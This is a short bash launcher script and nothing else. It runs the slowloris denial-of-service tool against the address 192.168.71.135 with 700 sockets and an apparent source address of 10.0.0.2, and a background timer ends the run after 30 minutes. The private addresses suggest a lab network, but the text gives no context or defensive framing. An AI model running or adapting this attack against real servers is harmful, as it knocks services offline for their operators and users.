#!/bin/bash

( sleep 1800 && kill $$ ) &
python3 slowloris.py 192.168.71.135 -S 10.0.0.2 -s 700
